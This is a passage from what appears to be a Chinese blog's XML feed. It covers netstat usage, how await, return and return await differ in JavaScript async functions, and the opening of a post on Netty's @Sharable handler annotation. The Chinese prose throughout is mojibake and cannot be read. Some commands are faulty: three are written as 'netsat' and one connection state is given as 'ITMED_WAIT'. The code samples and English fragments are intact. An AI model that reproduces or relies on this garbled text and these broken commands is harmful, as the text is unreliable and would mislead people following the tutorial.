ESTABLISHED </span><br></pre></td></tr></table></figure><p> ä½¿ç”¨ -u é€‰é¡¹åˆ—å‡º UDP åè®®çš„è¿æ¥ï¼š</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">udp        0      0 172.22.203.148:ntp          *:*                                     </span><br><span class="line">udp        0      0 *:ntp                       *:*   </span><br></pre></td></tr></table></figure></li><li><p>ç¦ç”¨åå‘åŸŸåè§£æï¼ŒåŠ å¿«æŸ¥è¯¢é€Ÿåº¦</p><p> å½“ä½ ä¸æƒ³è®©ä¸»æœºï¼Œç«¯å£å’Œç”¨æˆ·åæ˜¾ç¤ºï¼Œä½¿ç”¨netstat -nã€‚ä¾‹å¦‚ä¸Šé¢çš„ä¾‹å­ä¸­ä¼šæ˜¾ç¤ºmysqlã€sshã€httpç­‰ä¿¡æ¯ã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0      0 0.0.0.0:443                 0.0.0.0:*                   LISTEN      </span><br><span class="line">tcp        0     40 172.22.203.148:22           1.203.80.198:51439          ESTABLISHED </span><br></pre></td></tr></table></figure><p> å¦‚æœåªæ˜¯ä¸æƒ³è®©è¿™ä¸‰ä¸ªåç§°ä¸­çš„ä¸€ä¸ªè¢«æ˜¾ç¤ºï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤:</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsat -a --numeric-ports</span><br><span class="line">netsat -a --numeric-hosts</span><br><span class="line">netsat -a --numeric-users</span><br></pre></td></tr></table></figure></li><li><p>æŒç»­è¾“å‡ºnetstatä¿¡æ¯</p><p> <code>-c</code>æ¯éš”ä¸€ç§’è¾“å‡ºç½‘ç»œä¿¡æ¯ã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -act</span><br></pre></td></tr></table></figure><p> ä¸Šé¢ä¾‹å­ä¼šæ¯éš”ä¸€ç§’æ‰“å°ä¸€æ¬¡æ‰€æœ‰çš„tcpè¿æ¥ä¿¡æ¯ã€‚</p></li><li><p>åªåˆ—å‡ºç›‘å¬ä¸­çš„è¿æ¥</p><p> ä»»ä½•ç½‘ç»œæœåŠ¡çš„åå°è¿›ç¨‹éƒ½ä¼šæ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œç”¨äºç›‘å¬æ¥å…¥çš„è¯·æ±‚ã€‚è¿™äº›æ­£åœ¨ç›‘å¬çš„å¥—æ¥å­—ä¹Ÿå’Œè¿æ¥çš„å¥—æ¥å­—ä¸€æ ·ï¼Œä¹Ÿèƒ½è¢« netstat åˆ—å‡ºæ¥ã€‚ä½¿ç”¨ -l é€‰é¡¹åˆ—å‡ºæ­£åœ¨ç›‘å¬çš„å¥—æ¥å­—ã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -lt</span></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 *:mysql                     *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:http                      *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:ssh                       *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:https                     *:*                         LISTEN  </span><br></pre></td></tr></table></figure><p> ä¸Šé¢ä¾‹å­ä¼šåˆ—å‡ºæ‰€æœ‰ç›‘å¬çš„tcpè¿æ¥ã€‚å¦‚æœæˆ‘ä»¬æƒ³æ‰¾åˆ°NginxæœåŠ¡å™¨æ˜¯å“ªä¸ªè¿›ç¨‹ï¼Œå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ï¼š</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> netstat -nltp | grep :80</span></span><br><span class="line">tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      10236/nginx </span><br></pre></td></tr></table></figure><blockquote><p>å…¶ä¸­<code>-p</code>ç”¨äºæ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯</p></blockquote></li><li><p>æ‰“å°ç½‘ç»œæ¥å£</p><p> netstat ä¹Ÿèƒ½æ‰“å°ç½‘ç»œæ¥å£ä¿¡æ¯ï¼Œ-i é€‰é¡¹å°±æ˜¯ä¸ºè¿™ä¸ªåŠŸèƒ½è€Œç”Ÿã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -i</span></span><br><span class="line">Kernel Interface table</span><br><span class="line">Iface       MTU Met    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg</span><br><span class="line">eth0       1500   0 66299097      0      0      0 56635148      0      0      0 BMRU</span><br><span class="line">lo        65536   0 490435979      0      0      0 490435979      0      0      0 LRU</span><br></pre></td></tr></table></figure><p> ä¸Šé¢è¾“å‡ºçš„ä¿¡æ¯æ¯”è¾ƒåŸå§‹ã€‚æˆ‘ä»¬å°† <code>-e</code> é€‰é¡¹å’Œ <code>-i</code> é€‰é¡¹æ­é…ä½¿ç”¨ï¼Œå¯ä»¥è¾“å‡ºç”¨æˆ·å‹å¥½çš„ä¿¡æ¯ã€‚</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -ie</span></span><br><span class="line">Kernel Interface table</span><br><span class="line">eth0    Link encap:Ethernet  HWaddr 00:16:3E:16:15:19  </span><br><span class="line">        inet addr:172.22.203.148  Bcast:172.22.203.255  Mask:255.255.240.0</span><br><span class="line">        UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">        RX packets:66299089 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">        TX packets:56635140 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">        collisions:0 txqueuelen:1000 </span><br><span class="line">        RX bytes:34498067027 (32.1 GiB)  TX bytes:96455017529 (89.8 GiB)</span><br><span class="line"></span><br><span class="line">lo      Link encap:Local Loopback  </span><br><span class="line">        inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">        UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">        RX packets:490435979 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">        TX packets:490435979 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">        collisions:0 txqueuelen:0 </span><br><span class="line">        RX bytes:33910368878 (31.5 GiB)  TX bytes:33910368878 (31.5 GiB)</span><br></pre></td></tr></table></figure></li><li><p>é…åˆ watch å‘½ä»¤ç›‘è§†å’ŒæŸä¸ªIPçš„æ‰€æœ‰è¿æ¥</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">watch -d -n0 <span class="string">&quot;netstat -t | grep 1.203.80.198&quot;</span></span></span><br></pre></td></tr></table></figure></li><li><p>ç»Ÿè®¡è¿æ¥çŠ¶æ€</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -n | awk <span class="string">&#x27;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#x27;</span></span></span><br><span class="line">CLOSE_WAIT 2</span><br><span class="line">ESTABLISHED 4</span><br></pre></td></tr></table></figure><p> çŠ¶æ€è¯´æ˜</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CLOSEDï¼šæ— è¿æ¥æ˜¯æ´»åŠ¨çš„æˆ–æ­£åœ¨è¿›è¡Œ</span><br><span class="line">LISTENï¼šæœåŠ¡å™¨åœ¨ç­‰å¾…è¿›å…¥å‘¼å«</span><br><span class="line">SYN_RECVï¼šä¸€ä¸ªè¿æ¥è¯·æ±‚å·²ç»åˆ°è¾¾ï¼Œç­‰å¾…ç¡®è®¤</span><br><span class="line">SYN_SENTï¼šåº”ç”¨å·²ç»å¼€å§‹ï¼Œæ‰“å¼€ä¸€ä¸ªè¿æ¥</span><br><span class="line">ESTABLISHEDï¼šæ­£å¸¸æ•°æ®ä¼ è¾“çŠ¶æ€</span><br><span class="line">FIN_WAIT1ï¼šåº”ç”¨è¯´å®ƒå·²ç»å®Œæˆ</span><br><span class="line">FIN_WAIT2ï¼šå¦ä¸€è¾¹å·²åŒæ„é‡Šæ”¾</span><br><span class="line">ITMED_WAITï¼šç­‰å¾…æ‰€æœ‰åˆ†ç»„æ­»æ‰</span><br><span class="line">CLOSINGï¼šä¸¤è¾¹åŒæ—¶å°è¯•å…³é—­</span><br><span class="line">TIME_WAITï¼šå¦ä¸€è¾¹å·²åˆå§‹åŒ–ä¸€ä¸ªé‡Šæ”¾</span><br><span class="line">LAST_ACKï¼šç­‰å¾…æ‰€æœ‰åˆ†ç»„æ­»æ‰</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://linux.cn/article-2434-1.html">netstat çš„10ä¸ªåŸºæœ¬ç”¨æ³•</a></li><li><a href="http://man.linuxde.net/netstat">netstatå‘½ä»¤</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>await-vs-return-vs-return-await</title>
      <link href="/post/await-vs-return-vs-return-await.html"/>
      <url>/post/await-vs-return-vs-return-await.html</url>
      
        <content type="html"><![CDATA[<h2 id="await-vs-return-vs-return-await"><a href="#await-vs-return-vs-return-await" class="headerlink" title="await vs return vs return await"></a>await vs return vs return await</h2><p>åœ¨å†™<code>async</code>å‡½æ•°æ—¶ï¼Œ<code>await</code>ã€<code>return</code>å’Œ<code>return await</code>æ˜¯ä¸åŒçš„ï¼Œé€‰æ‹©æ­£ç¡®çš„å†™æ³•å¾ˆé‡è¦ã€‚</p><p>ä»ä¸‹é¢è¿™ä¸ª<code>async</code>å‡½æ•°å¼€å§‹å§ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">waitAndMaybeReject</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// Wait one second</span></span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line">  <span class="comment">// Toss a coin</span></span><br><span class="line">  <span class="keyword">const</span> isHeads = <span class="title class_">Boolean</span>(<span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isHeads) <span class="keyword">return</span> <span class="string">&#x27;yay&#x27;</span>;</span><br><span class="line">  <span class="keyword">throw</span> <span class="title class_">Error</span>(<span class="string">&#x27;Boo!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°1ç§’åè¿”å›ä¸€ä¸ªPromiseï¼Œè¿”å›<code>yay</code>å’ŒæŠ›å‡ºå¼‚å¸¸çš„æ¦‚ç‡éƒ½æ˜¯50%ã€‚ä¸‹é¢æˆ‘ä»¬ç”¨ä¸åŒçš„æ–¹å¼è°ƒç”¨å®ƒï¼š</p><h3 id="Just-calling"><a href="#Just-calling" class="headerlink" title="Just calling"></a>Just calling</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// waitAndMaybeReject å°†è¿”å›ä¸€ä¸ª promise; </span></span><br><span class="line">    <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ è°ƒç”¨<code>foo</code>ï¼Œè¿”å›çš„promiseå¯¹è±¡æ€»æ˜¯ç«‹å³è¿”å›<code>undefined</code>ï¼Œä¸ä¼šç­‰å¾…ã€‚</p><p>å› ä¸ºæˆ‘ä»¬æ²¡ç”¨<code>await</code>æˆ–è€…<code>return</code>æ‰§è¡Œ<code>waitAndMaybeReject</code>å‡½æ•°ï¼Œå¯¹äº<code>waitAndMaybeReject</code>æˆ‘ä»¬ä¸èƒ½åšä»€ä¹ˆã€‚è¿™ç§å†™æ³•ä¸€èˆ¬æ˜¯é”™çš„ã€‚</p><blockquote><p><code>waitAndMaybeReject</code>ä¼šç«‹å³è¿”å›ä¸€ä¸ªpromiseï¼Œfooå‡½æ•°ä¼šç«‹å³ç»“æŸã€‚æˆ‘ä»¬ä¸ä¼šçœ‹åˆ°<code>waitAndMaybeReject</code>å‡½æ•°å†…éƒ¨å»¶è¿Ÿæ‰§è¡Œçš„1sã€‚<code>waitAndMaybeReject</code>å‡½æ•°å†…éƒ¨æŠ›å‡ºçš„ä»»ä½•å¼‚å¸¸å’Œç»“æœæˆ‘ä»¬ä¹Ÿæ— æ³•æ•è·æˆ–è€…æ¥å—ã€‚</p></blockquote><h3 id="Awaiting"><a href="#Awaiting" class="headerlink" title="Awaiting"></a>Awaiting</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ è°ƒç”¨<code>foo</code>ï¼Œè¿”å›çš„promiseå°†åœ¨1ç§’åè¿”å›ä¸€ä¸ª<code>undefined</code>æˆ–è€…<code>caught</code>ã€‚</p><p>å› ä¸ºæˆ‘ä»¬ç­‰å¾…<code>waitAndMaybeReject()</code>çš„æ‰§è¡Œç»“æœï¼Œå®ƒæŠ›å‡ºçš„å¼‚å¸¸å°†ä¼šè¢«<code>catch</code>è¯­å¥æ•è·ï¼Œå¦‚æœå®ƒæ­£å¸¸æ‰§è¡Œè¿™ä¸ªå‡½æ•°ä»€ä¹ˆå°†ä¸ä¼šè¿”å›ä»»ä½•å€¼<code>undefined</code>ã€‚</p><blockquote><p>è¿™é‡Œç›¸å½“äºè°ƒç”¨äº†<code>waitAndMaybeReject</code>å‡½æ•°ï¼Œå¦‚æœ<code>waitAndMaybeReject</code>æŠ›å‡ºå¼‚å¸¸æˆ‘ä»¬å°†å¿½ç•¥æ‰å¼‚å¸¸é‡æ–°è¿”å›ä¸€ä¸ª<code>caught</code>å­—ç¬¦ä¸²ï¼Œå¦‚æœ<code>waitAndMaybeReject</code>æ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œ<code>foo</code>å‡½æ•°å°†æ— è¿”å›å€¼<code>undefined</code>ã€‚</p></blockquote><h3 id="Returning"><a href="#Returning" class="headerlink" title="Returning"></a>Returning</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ è°ƒç”¨<code>foo</code>ï¼Œè¿™ä¸ªè¿”å›çš„promiseå¯¹è±¡å°†ç­‰å¾…1ç§’åè¿”å›<code>yay</code>æˆ–è€…æŠ›å‡ºä¸€ä¸ª<code>Boo!</code>å¼‚å¸¸ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬<code>foo</code>çš„è¿”å›å€¼å…¶å®å°±æ˜¯<code>waitAndMaybeReject</code>çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬çš„<code>catch</code>è¯­å¥å°†æ°¸è¿œä¸ä¼šæ‰§è¡Œã€‚</p><blockquote><p>è¿™ä¸ª<code>foo</code>å‡½æ•°çš„å°è£…æ¯«æ— æ„ä¹‰ï¼Œç›¸å½“äºç›´æ¥è°ƒç”¨<code>waitAndMaybeReject</code>ã€‚</p></blockquote><h3 id="Return-awaiting"><a href="#Return-awaiting" class="headerlink" title="Return-awaiting"></a>Return-awaiting</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è°ƒç”¨<code>foo</code>åï¼Œè¿”å›çš„promiseå°†ç­‰å¾…1ç§’åè¿”å›ä¸€ä¸ª<code>yay</code>æˆ–è€…<code>caught</code>ã€‚</p><p>å½“æˆ‘ä»¬ç­‰å¾…<code>waitAndMaybeReject()</code>çš„ç»“æœæ—¶ï¼Œå®ƒå¦‚æœæŠ›å‡ºå¼‚å¸¸å°†è¢«æˆ‘ä»¬çš„<code>catch</code>è¯­å¥æ•è·ï¼Œæˆ‘ä»¬ä¼šè¿”å›ä¸€ä¸ª<code>catch</code>å­—ç¬¦ä¸²ï¼Œå¦‚æœè¿™ä¸ªå‡½æ•°æ­£å¸¸æ‰§è¡Œï¼Œæˆ‘ä»¬å°†è¿”å›å®ƒçš„è¿”å›å€¼<code>yay</code>ã€‚</p><p>æˆ‘ä»¬å°†ä¸Šé¢å‡½æ•°æ‹†åˆ†æˆä¸¤æ­¥å°±æ˜¯ä¸‹é¢çš„å½¢å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// Wait for the result of waitAndMaybeReject() to settle,</span></span><br><span class="line">    <span class="comment">// and assign the fulfilled value to fulfilledValue:</span></span><br><span class="line">    <span class="keyword">const</span> fulfilledValue = <span class="keyword">await</span> <span class="title function_">waitAndMaybeReject</span>();</span><br><span class="line">    <span class="comment">// If the result of waitAndMaybeReject() rejects, our code</span></span><br><span class="line">    <span class="comment">// throws, and we jump to the catch block.</span></span><br><span class="line">    <span class="comment">// Otherwise, this block continues to run:</span></span><br><span class="line">    <span class="keyword">return</span> fulfilledValue;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;caught&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå¦‚æœæ²¡æœ‰<code>try/catch</code>åŒ…è£¹çš„<code>return await</code>å‡½æ•°æ˜¯å†—ä½™çš„ï¼Œå¯ä»¥ä½¿ç”¨<a href="https://github.com/eslint/eslint/blob/master/docs/rules/no-return-await.md">ESLint</a>å»æ£€æµ‹ã€‚ä½†æ˜¯åœ¨<code>try/catch</code>é‡Œé¢æ˜¯å…è®¸çš„ã€‚</p><blockquote><p>å¦‚æœæ²¡æœ‰<code>try/catch</code>åŒ…è£¹æ—¶<code>waitAndMaybeReject</code>æŠ›å¼‚å¸¸ï¼Œå°†ä¼šä»<code>foo</code>é‡Œé¢æŠ›å‡ºå»ï¼Œå¦‚æœæ­£ç¡®è¿”å›å°†ä¼šä»fooçš„ç»“æœä¸­è·å–ã€‚è¿™ç›¸å½“äº<code>return waitAndMaybeReject()</code>ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨<code>waitAndMaybeReject()</code>è¿”å›çš„promiseæ¯”<code>foo</code>è¿”å›çš„promiseæ›´ç®€å•æ¸…æ™°ã€‚</p></blockquote><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://jakearchibald.com/2017/await-vs-return-vs-return-await/">await vs return vs return await</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> async </tag>
            
            <tag> await </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netty Sharable Handler</title>
      <link href="/post/netty-sharable-handler.html"/>
      <url>/post/netty-sharable-handler.html</url>
      
        <content type="html"><![CDATA[<h2 id="Sharable"><a href="#Sharable" class="headerlink" title="@Sharable"></a>@Sharable</h2><p>å¯¹äº<code>@Sharable</code>æ–‡æ¡£é‡Œé¢æ˜¯è¿™æ ·è¯´æ˜çš„</p><blockquote><p>å¯¹äºè¿™ç§ç”¨æ³•æŒ‡åœ¨å¤šä¸ª<code>ChannelPipeline</code>ä¸­å…±äº«åŒä¸€ä¸ª<code>ChannelHandler</code>ï¼Œå¯¹åº”çš„<code>ChannelHandler</code>å¿…é¡»è¦ä½¿ç”¨<code>@Sharable</code>æ³¨è§£æ ‡æ³¨ï¼›å¦åˆ™ï¼Œè¯•å›¾å°†å®ƒæ·»åŠ åˆ°å¤šä¸ª<code>ChannelPipeline</code>æ—¶å°†ä¼šè§¦å‘å¼‚å¸¸ã€‚</p></blockquote><p><code>@Sharable</code>å…¶å®å°±æ˜¯ä¸€ä¸ª<code>æ ‡è¯†å‹çš„æ³¨è§£</code>ï¼Œå¯ä»¥è®¤ä¸ºæˆ‘ä»¬æ ‡è¯†è¿™ä¸ª<code>ChannelHandler</code>æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p><p>ä¸‹é¢ä¾‹å­ä¸­<code>ChannelInboundHandler1</code>æ˜¯æ— çŠ¶æ€çš„ï¼Œ<code>ChannelInboundHandler2</code>æ˜¯æœ‰çŠ¶æ€çš„ã€‚<code>ChannelInboundHandler1</code>å¤©ç„¶æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œæˆ‘ä»¬åœ¨å¤šä¸ª<code>ChannelPipeline</code>ä½¿ç”¨åŒä¸€ä¸ªHandlerç¤ºä¾‹å°±å¯ä»¥å‡å°‘å¯¹è±¡çš„é¢‘ç¹åˆ›å»ºå’Œåƒåœ¾å›æ”¶ã€‚å¦‚æœæƒ³åœ¨å¤šä¸ª<code>ChannelPipeline</code>ä¸­å…±äº«<code>ChannelInboundHandler1</code>å®ä¾‹å°±è¦å°†å…¶æ ‡æ³¨ä¸º<code>@Sharable</code>ï¼Œå¦åˆ™éœ€è¦æ¯æ¬¡éƒ½<code>new</code>ä¸€ä¸ªæ–°çš„å®ä¾‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ— çŠ¶æ€</span></span><br><span class="line"><span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelInboundHandler1</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰çŠ¶æ€</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChannelInboundHandler2</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ChannelHandlerContext ctx;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handlerAdded</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.ctx = ctx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketChatServerInitializer</span> <span class="keyword">extends</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt; &#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ChannelInboundHandler1</span> <span class="variable">channelInboundHandler1</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChannelInboundHandler1</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChannelPipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> 